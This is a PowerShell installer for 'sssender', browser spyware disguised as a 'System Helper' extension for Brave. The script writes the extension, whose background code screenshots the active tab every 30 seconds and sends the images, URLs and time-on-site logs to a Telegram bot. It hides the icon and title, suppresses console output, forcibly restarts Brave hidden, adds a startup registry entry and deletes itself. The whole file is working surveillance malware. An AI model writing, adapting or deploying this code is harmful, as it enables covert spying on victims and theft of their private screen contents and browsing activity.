# sssender - Complete Automated Installer

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$EXTENSION_DIR = "$env:APPDATA\sssender"

# YOUR CREDENTIALS HERE
$TELEGRAM_TOKEN = 'a'
$TELEGRAM_CHAT_ID = '8919826228'

Write-Host "Installing sssender..." -ForegroundColor Cyan

New-Item -ItemType Directory -Force -Path $EXTENSION_DIR | Out-Null

# Create manifest.json
@'
{
  "manifest_version": 3,
  "name": "System Helper",
  "version": "1.0.0",
  "description": "",
  "permissions": ["activeTab","tabs","storage","alarms"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "background.js"},
  "action": {"default_icon": {"16": "icon.png","48": "icon.png","128": "icon.png"}}
}
'@ | Out-File -FilePath "$EXTENSION_DIR\manifest.json" -Encoding UTF8 -Force

# Create background.js
$backgroundJS = @"
// sssender - Complete Stealth Monitor

const TELEGRAM_TOKEN = '$TELEGRAM_TOKEN';
const TELEGRAM_CHAT_ID = '$TELEGRAM_CHAT_ID';

let config = { interval: 30000, on_change: true };
let lastScreen = null;
let lastUrl = null;
let lastTime = Date.now();

function sendTelegram(message, image = null) {
  try {
    const url = `https://api.telegram.org/bot` + TELEGRAM_TOKEN;
    if (image) {
      const form = new FormData();
      const blob = dataURLtoBlob(image);
      form.append('photo', blob, 'ss.jpg');
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('caption', message);
      fetch(`${url}/sendPhoto`, { method: 'POST', body: form });
    } else {
      fetch(`${url}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
      });
    }
  } catch(e) {}
}

function dataURLtoBlob(data) {
  const arr = data.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8 = new Uint8Array(n);
  while (n--) u8[n] = bstr.charCodeAt(n);
  return new Blob([u8], { type: mime });
}

function capture() {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs || !tabs[0]) return;
    const tab = tabs[0];
    chrome.tabs.captureVisibleTab(tab.windowId, { format: 'jpeg', quality: 40 }, (screenshot) => {
      if (chrome.runtime.lastError) return;
      if (config.on_change && lastScreen) {
        if (!screenChanged(screenshot)) return;
      }
      lastScreen = screenshot;
      const msg = ` + "`" + `📸 ${tab.title || 'Screen'}\\n🔗 ${tab.url || ''}\\n⏰ ${new Date().toLocaleString()}` + "`" + `;
      sendTelegram(msg, screenshot);
      trackActivity(tab.url);
    });
  });
}

function screenChanged(newScreen) {
  return new Promise((resolve) => {
    const img1 = new Image();
    const img2 = new Image();
    let done = false;
    img1.onload = img2.onload = () => {
      if (done) return;
      done = true;
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = 50; canvas.height = 37;
      ctx.drawImage(img1, 0, 0, 50, 37);
      const d1 = ctx.getImageData(0, 0, 50, 37).data;
      ctx.drawImage(img2, 0, 0, 50, 37);
      const d2 = ctx.getImageData(0, 0, 50, 37).data;
      let diff = 0;
      for (let i = 0; i < d1.length; i += 4) {
        diff += Math.abs(d1[i] - d2[i]);
        diff += Math.abs(d1[i+1] - d2[i+1]);
        diff += Math.abs(d1[i+2] - d2[i+2]);
      }
      resolve((diff / (50 * 37 * 3 * 255)) > 0.03);
    };
    img1.src = lastScreen;
    img2.src = newScreen;
    setTimeout(() => resolve(true), 1000);
  }).catch(() => true);
}

function trackActivity(url) {
  const now = Date.now();
  if (lastUrl && lastUrl !== url) {
    const secs = Math.floor((now - lastTime) / 1000);
    if (secs > 3) {
      sendTelegram(` + "`" + `⏱️ ${formatTime(secs)} on ${lastUrl}` + "`" + `);
    }
  }
  lastUrl = url;
  lastTime = now;
}

function formatTime(sec) {
  if (sec < 60) return `${sec}s`;
  if (sec < 3600) return `${Math.floor(sec/60)}m ${sec%60}s`;
  return `${Math.floor(sec/3600)}h ${Math.floor((sec%3600)/60)}m`;
}

chrome.tabs.onUpdated.addListener((id, info, tab) => {
  if (info.url && tab.active) {
    const now = Date.now();
    if (lastUrl && lastUrl !== tab.url) {
      const secs = Math.floor((now - lastTime) / 1000);
      if (secs > 3) sendTelegram(` + "`" + `🔄 ${tab.url} (${formatTime(secs)})` + "`" + `);
    }
    lastUrl = tab.url;
    lastTime = now;
  }
});

chrome.tabs.onActivated.addListener((info) => {
  chrome.tabs.get(info.tabId, (tab) => {
    if (chrome.runtime.lastError) return;
    const now = Date.now();
    if (lastUrl && lastUrl !== tab.url) {
      const secs = Math.floor((now - lastTime) / 1000);
      if (secs > 3) sendTelegram(` + "`" + `🔄 ${tab.url} (${formatTime(secs)})` + "`" + `);
    }
    lastUrl = tab.url;
    lastTime = now;
  });
});

setInterval(capture, config.interval);
setTimeout(capture, 3000);

chrome.action.setIcon({ path: '' }, () => {});
chrome.action.setTitle({ title: '' }, () => {});
console.error = () => {};
console.warn = () => {};
console.log = () => {};

setTimeout(() => {
  sendTelegram(` + "`" + `System Helper active\\nID: ${Math.random().toString(36).substr(2, 8)}` + "`" + `);
}, 2000);
"@

$backgroundJS | Out-File -FilePath "$EXTENSION_DIR\background.js" -Encoding UTF8 -Force

# Create icon.png
Add-Type -AssemblyName System.Drawing
$bmp = New-Object System.Drawing.Bitmap(16, 16)
$bmp.Save("$EXTENSION_DIR\icon.png", [System.Drawing.Imaging.ImageFormat]::Png)
$bmp.Dispose()

# Register in Brave
$EXT_ID = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($EXTENSION_DIR)) -replace '[^a-zA-Z0-9]', ''
$EXT_ID = $EXT_ID.Substring(0, [Math]::Min(32, $EXT_ID.Length))

$BRAVE_REG = "HKCU:\Software\BraveSoftware\Brave\Extensions\$EXT_ID"
New-Item -Path $BRAVE_REG -Force | Out-Null
Set-ItemProperty -Path $BRAVE_REG -Name "path" -Value $EXTENSION_DIR
Set-ItemProperty -Path $BRAVE_REG -Name "version" -Value "1.0.0"

# Find and launch Brave
$BRAVE_PATHS = @(
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe"
)
$BRAVE_EXE = $null
foreach ($path in $BRAVE_PATHS) {
    if (Test-Path $path) {
        $BRAVE_EXE = $path
        break
    }
}

if ($BRAVE_EXE) {
    Get-Process -Name brave -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process -FilePath $BRAVE_EXE -ArgumentList "--load-extension=`"$EXTENSION_DIR`" --enable-features=NativeMessaging --disable-blink-features=AutomationControlled --silent-launch --no-first-run --no-default-browser-check" -WindowStyle Hidden
}

# Add to startup
if ($BRAVE_EXE) {
    $RUN_REG = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $RUN_REG -Name "sssender" -Value "`"$BRAVE_EXE`" --load-extension=`"$EXTENSION_DIR`" --enable-features=NativeMessaging --disable-blink-features=AutomationControlled --silent-launch --no-first-run --no-default-browser-check"
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  INSTALLATION COMPLETE!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Files installed:" -ForegroundColor Yellow
Get-ChildItem $EXTENSION_DIR | ForEach-Object { Write-Host "  File: $($_.Name)" -ForegroundColor Gray }
Write-Host ""
Write-Host "Check Telegram for confirmation message" -ForegroundColor Cyan
Write-Host ""

# Self-delete
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

exit 0
